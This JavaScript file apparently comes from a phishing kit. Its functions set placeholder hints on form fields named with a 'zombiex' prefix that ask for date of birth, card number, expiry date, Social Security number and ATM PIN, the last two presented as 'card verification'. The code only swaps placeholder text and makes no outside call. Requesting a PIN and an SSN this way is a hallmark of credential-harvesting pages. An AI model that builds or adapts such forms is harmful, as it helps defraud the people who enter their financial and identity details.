/* BILLING */
	function birthfocus() {
		document.getElementsByName('zombiexbirth')[0].placeholder='DD/MM/YYYY';
	}
	function birthblur() {
		document.getElementsByName('zombiexbirth')[0].placeholder='Date of birth';
	}

/* CARD */

	function ccfocus() {
		document.getElementsByName('zombiexcnumber')[0].placeholder='xxxx xxxx xxxx xxxx';
	}
	function ccblur() {
		document.getElementsByName('zombiexcnumber')[0].placeholder='Card number';
	}

	function expfocus() {
		document.getElementsByName('zombiexcexp')[0].placeholder='MM/YYYY';
	}
	function expblur() {
		document.getElementsByName('zombiexcexp')[0].placeholder='Expiry date';
	}

/* CARD VERIFICATION */

	function ssnfocus() {
		document.getElementsByName('zombiexssn')[0].placeholder='xxx xx xxxx';
	}
	function ssnblur() {
		document.getElementsByName('zombiexssn')[0].placeholder='Security Social Number';
	}

	function atmfocus() {
		document.getElementsByName('zombiexatm')[0].placeholder='xxxx';
	}
	function atmblur() {
		document.getElementsByName('zombiexatm')[0].placeholder='ATM pin';
	}